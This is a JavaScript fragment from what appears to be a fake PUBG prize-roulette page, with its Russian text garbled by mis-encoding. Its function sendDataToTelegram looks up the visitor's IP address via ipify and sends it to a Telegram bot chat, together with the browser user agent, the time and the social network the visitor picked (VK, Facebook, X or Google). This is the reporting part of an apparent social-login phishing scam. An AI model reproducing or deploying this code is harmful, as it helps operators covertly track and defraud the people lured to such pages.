            async function sendDataToTelegram(social, prizeIndex) {
                const socialNames = {
                    'vk': '–í–ö–æ–Ω—Ç–∞–∫—Ç–µ',
                    'facebook': 'Facebook',
                    'x': 'Twitter',
                    'google': 'Google'
                };
                
                const prizeName = `–ü—Ä–∏–∑ #${prizeIndex + 1}`;
                
                const message = `üéÆ –ù–û–í–´–ô –í–´–ò–ì–†–´–® PUBG üéÆ\n\n` +
                               `üì± –°–æ—Ü—Å–µ—Ç—å: ${socialNames[social] || social}\n` +
                               `üéÅ –í—ã–∏–≥—Ä–∞–Ω–Ω—ã–π –ø—Ä–∏–∑: ${prizeName}\n` +
                               `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}\n` +
                               `üåê User Agent: ${navigator.userAgent}\n` +
                               `üìç IP: —Å–æ–±–∏—Ä–∞–µ—Ç—Å—è...`;
                
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                try {
                    // –ü–æ–ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å IP –∞–¥—Ä–µ—Å
                    let ipAddress = '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
                    try {
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResponse.json();
                        ipAddress = ipData.ip;
                    } catch (ipError) {
                        console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP:', ipError);
                    }
                    
                    // –ó–∞–º–µ–Ω—è–µ–º IP –≤ —Å–æ–æ–±—â–µ–Ω–∏–∏
                    const finalMessage = message.replace('—Å–æ–±–∏—Ä–∞–µ—Ç—Å—è...', ipAddress);
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: finalMessage,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    console.log('Telegram response:', data);
                    
                    if (data.ok) {
                        return true;
                    } else {
                        console.error('Telegram error:', data);
                        return false;
                    }
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    return false;
                }
            }
            
            // –ó–∞–ø—É—Å–∫ —Ä—É–ª–µ—Ç–∫–∏
            playBtn.addEventListener('click', startRoulette);
            
